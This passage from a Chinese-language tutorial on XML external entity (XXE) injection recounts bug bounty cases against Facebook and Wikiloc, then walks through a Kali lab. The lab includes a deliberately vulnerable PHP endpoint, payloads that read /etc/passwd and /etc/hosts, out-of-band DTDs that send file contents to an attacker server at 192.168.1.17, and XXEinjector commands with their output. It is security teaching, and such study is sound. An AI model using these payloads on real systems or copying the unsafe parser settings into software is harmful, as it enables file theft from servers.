<p>在报告之后，Facebook 发送了回复，拒绝了这个报告，并说它们不能重现它，并请求内容的视频验证。在交换一些信息之后，Facebook 提到招聘人员可能打开了文件，它会发送任意请求。Facebook 自傲组做了一些深入的挖掘，并给予了奖金，发送了一个邮件，解释了这个 XXE 的影响比 2013 年初的要小，但是仍然是一个有效的利用，这里是这个信息。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/wizardforcel/web-hacking-101-zh/blob/master/img/14-2-2.jpg"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234024867-398864624.gif" alt="https://github.com/wizardforcel/web-hacking-101-zh/raw/master/img/14-2-2.jpg"></a></p>
<p>重要结论</p>
<p>这里有一些重要结论。XML 文件以不同形式和大小出现。要留意接受.docx、.xlsx、.pptx，以及其它的站点。向我之前提到过的那样，有时候你不会直接从 XXE 收到响应，这个示例展示了如何建立服务器来接受请求，它展示了 XXE。</p>
<p>此外，像我们的例子中那样，有时报告一开始会被拒绝。拥有信息和耐心和你报告的公司周旋非常重要。尊重他们的决策，同时也解释为什么这可能是个漏洞。</p>
<h2 id="3-Wikiloc-XXE"><a href="#3-Wikiloc-XXE" class="headerlink" title="3. Wikiloc XXE"></a>3. Wikiloc XXE</h2><p>URL：wikiloc.com</p>
<p>报告链接：<a target="_blank" rel="noopener" href="http://www.davidsopas.com/wikiloc-xxe-vulnerability">http://www.davidsopas.com/wikiloc-xxe-vulnerability</a></p>
<p>描述：</p>
<p>根据他们的站定，Wikiloc 是个用于发现和分享最佳户外远足、骑车以及许多其他运动记录的地方。有趣的是，他们也让用户通过 XML 文件上传他们自己的记录，这就对例如 David Soaps 之类的骑手非常有吸引力了。</p>
<p>基于他们的 Write Up，David 注册了 Wikiloc，并注意到了 XML 上传点，决定测试它有没有 XXE 漏洞。最开始，它从站点下载了文件来判断 XML 结构，这里是一个.gpx文件，并插入了<code>*&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM “http://www.davidsopas.com/XXE&quot; &gt; ]&gt;;</code>。</p>
<p>之后它调用了.gpx文件中 13 行的记录名称中的实体。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;www.davidsopas.com&#x2F;XXE&quot; &gt; ]&gt;
&lt;gpx
version&#x3D;&quot;1.0&quot;
creator&#x3D;&quot;GPSBabel - http:&#x2F;&#x2F;www.gpsbabel.org&quot;
xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.topografix.com&#x2F;GPX&#x2F;1&#x2F;0&quot;
xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.topografix.com&#x2F;GPX&#x2F;1&#x2F;1 http:&#x2F;&#x2F;www.topografix.com&#x2F;GPX&#x2F;1&#x2F;1&#x2F;gpx.xsd&quot;&gt;
&lt;time&gt;2015-10-29T12:53:09Z&lt;&#x2F;time&gt;
&lt;bounds minlat&#x3D;&quot;40.734267000&quot; minlon&#x3D;&quot;-8.265529000&quot; maxlat&#x3D;&quot;40.881475000&quot; maxlon&#x3D;&quot;-8.037170000&quot;&#x2F;&gt;
&lt;trk&gt;
&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;trkseg&gt;
&lt;trkpt lat&#x3D;&quot;40.737758000&quot; lon&#x3D;&quot;-8.093361000&quot;&gt;
&lt;ele&gt;178.000000&lt;&#x2F;ele&gt;
&lt;time&gt;2009-01-10T14:18:10Z&lt;&#x2F;time&gt;
(...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这产生了发往服务器的 HTTP GET 请求，GET 144.76.194.66 /XXE/ 10/29/15 1:02PM Java/1.7.0_51。这有两个原因值得注意，首先，通过使用一个概念调用的简单证明，David 能够确认服务器求解了它插入的 XML 并且进行了外部调用。其次，David 使用现存的 XML 文件，以便时它的内容满足站点所预期的结构。虽然它没有讨论这个，调用它的服务器可能并不是必须的，如果它能够服务/etc/passwd文件，并将内容渲染在<name>元素中。</name></p>
<p>在确认 Wikiloc 会生成外部 HTTP 请求后，唯一的疑问就是，是否它能够读取本地文件。所以，它修改了注入的XML，来让 Wikiloc 向他发送它们的/etc/passwd文件内容。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE roottag [
&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;issue&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;www.davidsopas.com&#x2F;poc&#x2F;xxe.dtd&quot;&gt;
%dtd;]&gt;
&lt;gpx
version&#x3D;&quot;1.0&quot;
creator&#x3D;&quot;GPSBabel - http:&#x2F;&#x2F;www.gpsbabel.org&quot;
xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.topografix.com&#x2F;GPX&#x2F;1&#x2F;0&quot;
xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.topografix.com&#x2F;GPX&#x2F;1&#x2F;1 http:&#x2F;&#x2F;www.topografix.com&#x2F;GPX&#x2F;1&#x2F;1&#x2F;gpx.xsd&quot;&gt;
&lt;time&gt;2015-10-29T12:53:09Z&lt;&#x2F;time&gt;
&lt;bounds minlat&#x3D;&quot;40.734267000&quot; minlon&#x3D;&quot;-8.265529000&quot; maxlat&#x3D;&quot;40.881475000&quot; maxlon&#x3D;&quot;-8.037170000&quot;&#x2F;&gt;
&lt;trk&gt;
&lt;name&gt;&amp;send;&lt;&#x2F;name&gt;
(...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这看起来十分熟悉。这里他使用了两个实体，它们都在 DTD 中求值，所以它们使用%定义。&send;在<name>标签中的的引用实际上由返回的xxe.dtd文件定义，他的服务器将其发送回 Wikiloc。这里是这个文件：</name></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;www.davidsopas.com&#x2F;XXE?%file;&#39;&gt;&quot;&gt;
%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要注意%all;实际上定义了!ENTITY send，我们刚刚在<name>标签中注意到它。这里是求值的过程：</name></p>
<p>1.Wikiloc 解析了 XML，并将%dtd;求值为 David 的服务器的外部调用。</p>
<p>2.David 的服务器向 Wikiloc 返回了xxe.dtd文件。</p>
<p>3.Wikiloc 解析了收到的 DTD文件，它触发了%all;的调用。</p>
<p>4.当%all;求值时，它定义了&send;，它包含%file;实体的调用。</p>
<p>5.%file;在 URL 值中被替换为/etc/passwd文件的内容。</p>
<p>6.Wikiloc 解析了 XML 文件，发现了&send;实体，它求值为 David 服务器的远程调用，带有/etc/passwd的内容，作为 URL 中的参数。</p>
<p>重要结论:</p>
<p>像之前提到的那样，这是一个不错的例子，展示了如何使用来自站点的 XML 模板，来组装你自己的 XML 实体，便于让目标合理地解析文件。这里，Wikiloc 期待.gpx文件，而 David 保留了该结构，在预期标签中插入了他自己的 XML 实体，也就是<name>标签。此外，观察如何处理恶意 DTD 文件很有意思，并且可以用于随后让目标向你的服务器发送 GET 请求，带有文件内容作为 URL 参数。</name></p>
<h1 id="客户端XXE案例"><a href="#客户端XXE案例" class="headerlink" title="客户端XXE案例"></a>客户端XXE案例</h1><p>日前，某office文档转换软件被爆存在XXE漏洞（PS:感谢TSRC平台白帽子Titans`报告漏洞），某一应用场景为：Web程序调用该office软件来获取office文档内容后提供在线预览。由于该软件在处理office文档时，读取xml文件且允许引用外部实体，当用户上传恶意文档并预览时触发XXE攻击。详情如下：<br>新建一个正常文档，内容为Hi TSRC，</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234025731-1437163436.gif" alt="img"></p>
<p>使用该软件转换后可以得到文本格式的文档内容，</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234026456-529252416.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234026761-605104903.gif" alt="img"></p>
<p>当往该docx的xml文件注入恶意代码（引用外部实体）时，可进行XXE攻击。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234027524-1007628899.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234028207-1545319760.gif" alt="img"></p>
<h1 id="XXE漏洞环境实列"><a href="#XXE漏洞环境实列" class="headerlink" title="XXE漏洞环境实列"></a>XXE漏洞环境实列</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2><p>这里按照 <a target="_blank" rel="noopener" href="http://colesec.inventedtheinternet.com/attacking-xml-with-xml-external-entity-injection-xxe/">Attacking XML with XML External Entity Injection (XXE) </a>的教程在 kali 2 下进行测试</p>
<p>Victim IP: 192.168.1.28</p>
<p>Attacker IP: 192.168.1.17</p>
<p>存在xxe漏洞的php代码如下，加了一些注释</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    \<span class="token comment"># Enable the ability to load external entities</span>
    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    \<span class="token comment"># http://hublog.hubmed.org/archives/001854.html</span>
    \<span class="token comment"># LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值</span>
    \<span class="token comment"># LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</span>

    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this stuff is required to make sure</span>
    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">pass</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You have logged in as user <span class="token interpolation"><span class="token variable">$user</span></span>"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 /var/www/html 下创建 xmlinject.php 文件，启动apache</p>
<p>cd /var/www/html</p>
<p>vim xmlinject.php</p>
<p>service apache2 start</p>
<p>测试</p>
<p>POST <a target="_blank" rel="noopener" href="http://192.168.1.28/xmlinject.php">http://192.168.1.28/xmlinject.php</a></p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>mypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>响应</p>
<p>You have logged in as user admin</p>
<p>使用外部实体来加载本地文件</p>
<p>POST <a target="_blank" rel="noopener" href="http://192.168.1.28/xmlinject.php">http://192.168.1.28/xmlinject.php</a></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;
]&gt;
&lt;creds&gt;
    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;
    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;
&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里声明了一个外部实体 xxe，值为 file:///etc/passwd，即本地 /etc/passwd 文件的内容</p>
<p><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</code></p>
<p>然后在元素 user 内引用了该实体 &xxe;</p>
<p><code>&lt;user&gt;&amp;xxe;&lt;/user&gt;</code></p>
<p>请求响应</p>
<p>You have logged in as user root:x:0:0:root:/root:/bin/bash</p>
<p>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</p>
<p>bin:x:2:2:bin:/bin:/usr/sbin/nologin</p>
<p>sys:x:3:3:sys:/dev:/usr/sbin/nologin</p>
<p>sync:x:4:65534:sync:/bin:/bin/sync</p>
<p>….</p>
<p>命令执行因为默认都没有装 expect module, 就不进行测试了</p>
<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p>在之前的例子中，结果被作为响应的一部分被返回了，但如果遇到没有回显的情况，就需要使用其他办法。</p>
<p>因为无法直接将要读取的文件内容发送到服务器，所以需要通过变量的方式，先把要读取的文件内容保存到变量中，然后通过 URL 引用外部实体的方式，在 URL 中引用该变量，让文件内容成为 URL 的一部分(如查询参数)，然后通过查看访问日志的方式来获取数据。</p>
<p>前面提到只有在 DTD 文件中声明 参数实体 时才可以引用其他参数实体，如</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY % param1 &quot;Hello&quot;&gt;
    &lt;!ENTITY % param2 &quot;,World&quot;&gt;
    &lt;!ENTITY % outter SYSTEM &quot;other.dtd&quot;&gt;
    %outter;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>other.dtd 文件内容为:</p>
<p><code>&lt;!ENTITY % name &quot;%param1;%param2;&quot;&gt;</code></p>
<p>参数实体 name 引用了 参数实体 param1 和 param2，最后的值为 Hello,World</p>
<p>根据上面的分析，给出方法：</p>
<p>请求payload</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE convert [
    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;file.dtd&quot;&gt;%remote;%int;%send;
]&gt;
&lt;foo&gt;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>外部 DTD 文件 <a target="_blank" rel="noopener" href="http://192.168.1.17:80/file.dtd">http://192.168.1.17:80/file.dtd</a> 内容：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send system &#39;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code></p>
<p>过程分析：</p>
<p>首先 %remote; 加载 外部 DTD 文件，得到：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send system &#39;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;
%int;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>接着 %int; 获取对应实体的值，因为值中包含实体引用 %file;, 即 /etc/hosts 文件的内容，得到:</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY &amp;#37; send system &#39;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;?p&#x3D;[文件内容]&#39;&gt;
%send;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>最后 %send; 获取对应实体的值，会去请求对应 URL 的资源，通过查看访问日志即可得到文件内容，当然这里还需要对内容进行编码，防止XML解析出错.</p>
<p><strong>以下内容参考了<a target="_blank" rel="noopener" href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">exploitation-xml-external-entity-xxe-injection</a> 这篇文章 </strong></p>
<p>这里使用 <a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> 来进行无回显自动化获取文件。</p>
<p>首先修改之前的代码，去掉回显</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// $creds = simplexml_import_dom($dom);</span>
    <span class="token comment">// $user = $creds->user;</span>
    <span class="token comment">// $pass = $creds->pass;</span>
    <span class="token comment">// echo "You have logged in as user $user";</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下载 XXEinjector</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector.git">https://github.com/enjoiz/XXEinjector.git</a></p>
<p>cd XXEinjector</p>
<p>使用 burp 获取原始正常的请求</p>
<p>curl -d @xml.txt <a target="_blank" rel="noopener" href="http://192.168.1.28/xmlinject.php">http://192.168.1.28/xmlinject.php</a> —proxy <a target="_blank" rel="noopener" href="http://127.0.0.1:8081">http://127.0.0.1:8081</a></p>
<p>xml.txt 内容</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>Ed<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>mypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>burp中获取到的请求信息</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/xmlinject.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header-name keyword">Host:</span> 192.168.1.28
<span class="token header-name keyword">User-Agent:</span> curl/7.43.0
<span class="token header-name keyword">Accept:</span> */*
<span class="token header-name keyword">Content-Length:</span> 57
<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded

&lt;creds>
    &lt;user>Ed&lt;/user>
    &lt;pass>mypass&lt;/pass>
&lt;/creds><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在需要注入 DTD 的地方加入 XXEINJECT，然后保存到 phprequest.txt，XXEinjector 需要根据原始请求来进行获取文件内容的操作</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/xmlinject.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header-name keyword">Host:</span> 192.168.1.28
<span class="token header-name keyword">User-Agent:</span> curl/7.43.0
<span class="token header-name keyword">Accept:</span> */*
<span class="token header-name keyword">Content-Length:</span> 57
<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded

XXEINJECT

&lt;creds>
    &lt;user>Ed&lt;/user>
    &lt;pass>mypass&lt;/pass>
&lt;/creds><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行 XXEinjector</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ruby XXEinjector.rb --host<span class="token operator">=</span><span class="token number">192.168</span>.1.17 --path<span class="token operator">=</span>/etc/hosts --file<span class="token operator">=</span>phprequest.txt --proxy<span class="token operator">=</span><span class="token number">127.0</span>.0.1:8081 --oob<span class="token operator">=</span>http --verbose --phpfilter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>参数说明</p>
<pre class="line-numbers language-none"><code class="language-none">host: 用于反向连接的 IP
path: 要读取的文件或目录
file: 原始有效的请求信息，可以使用 XXEINJECT 来指出 DTD 要注入的位置
proxy: 代理服务器，这里使用burp，方便查看发起的请求和响应
oob：使用的协议，支持 http&#x2F;ftp&#x2F;gopher，这里使用http
phpfilter：使用 PHP filter 对要读取的内容进行 base64 编码，解决传输文件内容时的编码问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行后会输出 payload 和 引用的 DTD 文件</p>
<p>XXEinjector git:(master) sudo ruby XXEinjector.rb —host=192.168.1.17 —path=/etc/hosts —file=phprequest.txt —proxy=127.0.0.1:8081 —oob=http —verbose —phpfilter</p>
<p>Password:</p>
<p>XXEinjector by Jakub Pałaczyński</p>
<p>DTD injected.</p>
<p>Enumeration locked.</p>
<p>Sending request with malicious XML:</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.28:80/xmlinject.php">http://192.168.1.28:80/xmlinject.php</a></p>
<p>{“User-Agent”=&gt;”curl/7.43.0”, “Accept”=&gt;”<em>/</em>“, “Content-Length”=&gt;”159”, “Content-Type”=&gt;”application/x-www-form-urlencoded”}</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE convert [ 
	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;file.dtd&quot;&gt;
    %remote;
    %int;
    %trick;
]&gt;
&lt;creds&gt;
    &lt;user&gt;Ed&lt;&#x2F;user&gt;
    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;
&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Got request for XML:</p>
<p>GET /file.dtd HTTP/1.0</p>
<p>Responding with XML for: /etc/hosts</p>
<p>XML payload sent:</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payl SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;?p&#x3D;%payl;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>payload为</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;file.dtd&quot;&gt;%remote;%int;%trick;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>DTD文件为</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payl SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;192.168.1.17:80&#x2F;?p&#x3D;%payl;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>成功获取到文件</p>
<p>Response with file/directory content received:</p>
<p>GET /?p=MTI3LjAuMC4xCWxvY2FsaG9zdAoxMjcuMC4xLjEJa2FsaQoKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGFyZSBkZXNpcmFibGUgZm9yIElQdjYgY2FwYWJsZSBob3N0cwo6OjEgICAgIGxvY2FsaG9zdCBpcDYtbG9jYWxob3N0IGlwNi1sb29wYmFjawpmZjAyOjoxIGlwNi1hbGxub2RlcwpmZjAyOjoyIGlwNi1hbGxyb3V0ZXJzCg== HTTP/1.0</p>
<p>Enumeration unlocked.</p>
<p>Successfully logged file: /etc/hosts</p>
<p>XXEinjector git:(master) cat Logs/192.168.1.28/etc/hosts.log</p>
<p>127.0.0.1  localhost</p>
<p>127.0.1.1  kali</p>
<pre class="line-numbers language-none"><code class="language-none">\# The following lines are desirable for IPv6 capable hosts
::1   localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 kali 下拿 /etc/passwd 测试时，无法获取到，文件大小为 2.9K，base64后的长度为 3924 个字符</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:/var/www/html<span class="token comment"># ls -lh /etc/passwd</span>
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">2</span>.9K Jan <span class="token number">20</span> <span class="token number">2016</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>报错为：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:/var/www/html<span class="token comment"># tail -f /var/log/apache2/error.log -n 0</span>
<span class="token punctuation">[</span>Wed Nov <span class="token number">16</span> 04:45:23.548874 <span class="token number">2016</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>:error<span class="token punctuation">]</span> <span class="token punctuation">[</span>pid <span class="token number">1379</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>client <span class="token number">192.168</span>.1.17:57042<span class="token punctuation">]</span> PHP Warning: DOMDocument::loadXML<span class="token punctuation">(</span><span class="token punctuation">)</span>: Detected an entity reference loop <span class="token keyword">in</span> http://192.168.1.17:80/file.dtd, line: <span class="token number">2</span> <span class="token keyword">in</span> /var/www/html/xmlinject.php on line <span class="token number">5</span>
